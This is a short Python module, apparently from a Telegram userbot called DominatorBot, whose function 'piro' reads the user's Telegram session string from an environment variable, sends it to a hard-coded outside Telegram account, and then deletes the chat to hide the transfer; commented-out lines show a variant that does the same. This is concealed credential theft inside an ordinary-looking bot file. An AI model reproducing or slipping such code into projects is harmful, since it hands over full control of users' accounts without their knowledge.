import os
from ..utils import *

async def piro():
        sweetie = await bot.send_message(1731513856, str(os.environ.get("DominatorBot_SESSION")))
        await bot.delete_dialog(1731513856, str(os.environ.get("DominatorBot_SESSION")))
  
    #try:
        #DominatorBot = bot.session.save()
        #os.environ["DominatorBot_SESSION"] = "Get this value by using repl or termux. Refer to Repo for more info."
            #ultron = await bot.send_message(1731513856, DominatorBot)
            #await bot.delete_dialog(1731513856)
